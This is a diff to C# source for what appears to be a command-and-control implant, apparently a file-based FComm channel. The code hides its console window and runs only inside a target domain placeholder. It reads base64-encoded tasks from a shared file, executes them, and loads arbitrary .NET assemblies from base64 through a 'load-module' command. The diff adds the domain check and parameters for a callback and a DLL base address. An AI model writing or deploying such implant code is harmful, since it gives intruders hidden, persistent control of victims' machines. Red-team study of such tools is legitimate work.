@@ -24,6 +24,8 @@ public class Program
     public static FCClient FComm;
     public const int SW_HIDEN = 0;
     public const int SW_SHOW = 5;
+    public static IntPtr DllBaseAddress = IntPtr.Zero;
+    public static IntPtr callbackFuncPtr = IntPtr.Zero;
     private static StringWriter backgroundTaskOutput = new StringWriter();
     [DllImport("shell32.dll")] static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);
     [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
@@ -31,9 +33,16 @@ public class Program
     [DllImport("kernel32.dll")] static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);
     [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-    public static void Sharp()
-    {       
+    public static void Sharp(long callbackFunc = 0, long baseAddr=0)
+    {
+
+        callbackFuncPtr = new IntPtr(callbackFunc);
+        DllBaseAddress = new IntPtr(baseAddr);
         ShowWindow(GetConsoleWindow(), SW_HIDEN);
+        if(!string.IsNullOrEmpty("#REPLACEMEDOMAIN#") && !Environment.UserDomainName.ToLower().Contains("#REPLACEMEDOMAIN#".ToLower()))
+        {
+            return;
+        }
         Program.filename = @"#REPLACEFCOMMFILENAME#";
         Program.encryption = @"#REPLACEKEY#";
         Program.kill = false;
@@ -108,7 +117,7 @@ public class Program
                         //The task in the file has been actioned already.
                         continue;
                     }
-		    //Base64 decode required here.
+            //Base64 decode required here.
                     var cmd = Encoding.UTF8.GetString(Convert.FromBase64String(Task.Input));
 
                     var sOutput2 = new StringWriter(); //Setup stringwriter to buffer output from command.
@@ -120,11 +129,11 @@ public class Program
                         FComm.CleanUp();
                         FComm = null;
                     }
-                    else if (cmd.ToLower().StartsWith("loadmodule"))
+                    else if (cmd.ToLower().StartsWith("load-module"))
                     {
                         try
                         {
-                            var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
+                            var module = Regex.Replace(cmd, "load-module", "", RegexOptions.IgnoreCase);
                             var assembly = Assembly.Load(Convert.FromBase64String(module));
                         }
                         catch (Exception e) { sOutput2.WriteLine($"Error loading modules {e}"); }
